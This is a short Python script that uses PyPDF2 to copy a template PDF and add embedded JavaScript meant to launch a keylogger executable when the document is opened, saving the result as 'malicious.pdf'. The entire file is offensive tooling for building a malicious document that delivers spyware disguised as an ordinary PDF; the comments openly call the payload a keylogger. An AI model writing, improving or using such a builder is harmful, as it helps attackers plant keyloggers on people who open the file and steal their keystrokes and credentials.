from PyPDF2 import PdfFileWriter, PdfFileReader

def embed_payload_into_pdf(pdf_template_path, payload_path, output_pdf_path):
    # Open the PDF template
    template_pdf = PdfFileReader(open(pdf_template_path, "rb"))
    output_pdf = PdfFileWriter()

    # Copy all pages from the template to the output
    for page_num in range(template_pdf.numPages):
        output_pdf.addPage(template_pdf.getPage(page_num))

    # Embed JavaScript to execute the payload (your keylogger executable)
    js_code = f'''
    var oApp = new ActiveXObject("Shell.Application");
    var command = "{payload_path}";
    oApp.ShellExecute(command);
    '''

    # Add JavaScript to the PDF
    output_pdf.addJS(js_code)

    # Write the modified PDF to a file
    with open(output_pdf_path, "wb") as output_file:
        output_pdf.write(output_file)

if __name__ == "__main__":
    # Paths to your files
    pdf_template = "pdf/template.pdf"       # Your PDF template
    keylogger_executable = "../keylogger/dist/keylogger.exe"  # Path to your keylogger executable
    output_pdf = "pdf/malicious.pdf"        # Output malicious PDF

    embed_payload_into_pdf(pdf_template, keylogger_executable, output_pdf)
